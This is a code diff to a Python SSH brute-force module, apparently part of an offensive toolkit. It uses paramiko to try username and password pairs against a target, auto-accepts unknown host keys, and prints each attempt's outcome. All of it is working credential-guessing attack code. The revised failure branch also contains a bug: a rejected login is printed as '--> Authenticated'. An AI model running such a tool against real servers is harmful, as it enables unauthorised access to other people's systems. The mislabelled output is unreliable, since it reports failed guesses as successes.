@@ -86,29 +86,24 @@ module_vars = {
 #This function does hte main exection of the brutefore method
 def run(username, password, target):
     verbose = module_vars['verbose']['Value']
-    creds = """
-    Username: {}
-    Password: {}
-    Target:   {}
-    """.format(username, password, target)
     timeout = module_vars['timeout']['Value']
     port = module_vars['port']['Value']
     banner_timeout = module_vars['banner-timeout']['Value']
+    attempt = "Target:{} Username:{} Password:{}".format(target, username, password)
 
     try:
-        print("Target:{} Username:{} Password:{}".format(target, username, password))
         client = paramiko.SSHClient()
         if module_vars['allow-hosts']['Value']:  
             client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         client.connect(target, username=username, password=password, timeout=timeout, banner_timeout=banner_timeout, port=port)
         client.close()
-        colors.PrintColor("SUCCESS", "Authenticated:\n{}".format(creds))
+        colors.PrintColor("SUCCESS", "{} --> Authenticated".format(attempt))
     except paramiko.AuthenticationException:
         if verbose:
-            colors.PrintColor("FAIL", "Authentication Failed")
+            colors.PrintColor("FAIL", "{} --> Authenticated".format(attempt))
     except paramiko.SSHException as sshException:
         if verbose:    
-            colors.PrintColor("FAIL", "Could not establish SSH connection")
+            colors.PrintColor("FAIL", "{} --> Could not establish SSH connection".format(attempt))
     except Exception as e:
         if verbose:
-            colors.PrintColor("FAIL", "Unable to connect --> {}".format(e))
+            colors.PrintColor("FAIL", "{} --> Error! {}".format(attempt,e))
